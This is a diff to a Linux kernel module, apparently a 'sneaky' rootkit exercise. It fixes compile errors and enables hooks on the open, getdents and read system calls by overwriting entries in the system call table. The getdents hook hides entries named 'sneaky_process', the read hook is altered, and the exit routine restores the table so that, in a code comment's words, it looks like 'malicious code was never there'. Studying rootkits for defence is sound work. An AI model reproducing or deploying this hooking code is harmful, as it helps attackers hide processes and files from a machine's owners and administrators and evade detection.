@@ -8,16 +8,16 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
-#include <string.h>
-#define _GNU_SOURCE
-#include <dirent.h>     /* Defines DT_* constants */
-#include <fcntl.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <stdlib.h>
-#include <sys/stat.h>
-#include <sys/syscall.h>
-#include <string.h>
+/* #include <string.h> */
+/* #define _GNU_SOURCE */
+/* #include <dirent.h>     /\* Defines DT_* constants *\/ */
+/* #include <fcntl.h> */
+/* #include <stdio.h> */
+/* #include <unistd.h> */
+/* #include <stdlib.h> */
+/* #include <sys/stat.h> */
+/* #include <sys/syscall.h> */
+/* #include <string.h> */
 
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
@@ -55,7 +55,7 @@ struct linux_dirent {
                char           d_type;    // File type (only since Linux
                                          // 2.6.4); offset is (d_reclen - 1)
 					 */
-}
+};
 /*
 e.g.
               inode#  file type  d_reclen  d_off d_name
@@ -75,8 +75,8 @@ e.g.
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 asmlinkage int (*original_call_open)(const char *pathname, int flags);
-asmlinkage int (*original_call_getdents)(const char *pathname, int flags);
-asmlinkage int (*original_call_read)(const char *pathname, int flags);
+asmlinkage int (*original_call_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int (*original_call_read)(int fd, void *buf, size_t count);
 
 
 //Define our new sneaky version of the 'open' syscall
@@ -92,15 +92,16 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
 {
   printk(KERN_INFO "Very, very Sneaky!\n");
 
-
+  struct linux_dirent * d = dirp;
+  unsigned int bpos = 0;
   int nread = original_call_getdents(fd, dirp, count);
   if(nread == -1) {
-    handle_error("getdents");
+    return -1;
   }
 
-  struct linux_dirent * d;
-  for (unsigned int bpos = 0; bpos < nread;) {
-    d = (struct linux_dirent *) (dirp + bpos);
+  
+  for (; bpos < nread;) {
+    d = dirp + bpos;
 
 
     if (strcmp(d->d_name, "sneaky_process") == 0 ||
@@ -125,10 +126,10 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
   return nread;
 }
 
-asmlinkage int sneaky_sys_read(const char *pathname, int flags)
+asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
 {
   printk(KERN_INFO "Very, very Sneaky!\n");  
-  return original_call_read(pathname, flags);
+  return 0;
 }
 
 
@@ -157,6 +158,13 @@ static int initialize_sneaky_module(void)
   original_call_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
+  original_call_getdents = (void*)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+
+  original_call_read = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+
+  
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -183,8 +191,11 @@ static void exit_sneaky_module(void)
 
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  *(sys_call_table + __NR_open) = (unsigned long)original_call_open;
 
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_call_getdents;
+
+  *(sys_call_table + __NR_read) = (unsigned long)original_call_read;
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
